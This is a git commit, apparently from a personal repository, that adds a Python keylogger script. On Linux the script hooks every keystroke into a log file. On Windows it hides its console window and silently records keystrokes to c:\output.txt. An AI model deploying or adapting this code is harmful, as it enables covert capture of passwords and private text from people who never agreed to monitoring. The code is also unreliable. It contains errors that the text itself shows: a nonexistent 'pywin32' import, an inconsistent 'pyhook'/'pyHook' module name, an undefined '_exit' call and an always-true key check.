f49c574cf7807a3e29808f32ada1e8808056128f
Shiv Bhatia <shivdev@live.ca>
2018-08-20 22:11:10 -0700

    Adding keylogger

---
+++ keylogger.py
@@ -0,0 +1,57 @@
+import sys
+
+print(sys.platform)
+
+if sys.platform == 'linux':
+	from Dependencies import pyxhook
+	log_file='/home/darthvader/Documents/file.log'
+	def OnKeyPress(event):
+		fob=open(log_file,'a')
+		fob.write(event.Key)
+		fob.write('\n')
+
+		if event.Ascii==96: #96 is the ascii value of the grave key (`)
+			fob.close()
+			new_hook.cancel()
+
+	#instantiate HookManager class
+	new_hook=pyxhook.HookManager()
+	#listen to all keystrokes
+	new_hook.KeyDown=OnKeyPress
+	#hook the keyboard
+	new_hook.HookKeyboard()
+	#start the session
+	new_hook.start()
+else:
+	import pyhook, pywin32
+	import win32api
+	import win32console
+	import win32gui
+	import pythoncom
+	
+	win=win32console.GetConsoleWindow()
+	win32gui.ShowWindow(win,0)
+ 
+	def OnKeyboardEvent(event):
+		if event.Ascii==5:
+			_exit(1)
+		if event.Ascii !=0 or 8:
+		#open output.txt to read current keystrokes
+			f=open('c:\output.txt','r+')
+			buffer=f.read()
+			f.close()
+			#open output.txt to write current + new keystrokes
+			f=open('c:\output.txt','w')
+			keylogs=chr(event.Ascii)
+			if event.Ascii==13:
+				keylogs='/n'
+			buffer+=keylogs
+			f.write(buffer)
+			f.close()
+	# create a hook manager object
+	hm=pyHook.HookManager()
+	hm.KeyDown=OnKeyboardEvent
+	# set the hook
+	hm.HookKeyboard()
+	# wait forever
+	pythoncom.PumpMessages()
